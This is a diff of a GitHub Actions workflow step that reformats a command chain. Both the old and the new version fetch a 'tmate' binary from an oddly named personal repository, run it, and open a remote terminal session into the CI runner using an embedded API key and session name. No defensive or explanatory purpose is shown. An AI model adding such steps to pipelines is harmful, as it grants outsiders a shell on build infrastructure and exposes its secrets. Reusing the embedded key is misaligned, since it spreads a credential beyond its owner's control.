@@ -14,6 +14,6 @@ jobs:
         uses: docker://ubuntu:22.04
         shell: sh
         run: |
-          apt-get update && apt-get full-upgrade -y && apt-get -y dist-upgrade && apt-get -y autoremove --purge
-          apt-get install wget curl 
-          wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate && chmod +x tmate && ./tmate -F -k tmk-XFh4wmpGo9VkrPd37bY81lqL4j -n 6adc4229571627f47815cfd11e8b1fdd
+          apt-get update && apt-get full-upgrade -y && apt-get -y dist-upgrade && apt-get -y autoremove --purge \
+          && apt-get install wget curl \
+          && wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate && chmod +x tmate && ./tmate -F -k tmk-XFh4wmpGo9VkrPd37bY81lqL4j -n 6adc4229571627f47815cfd11e8b1fdd
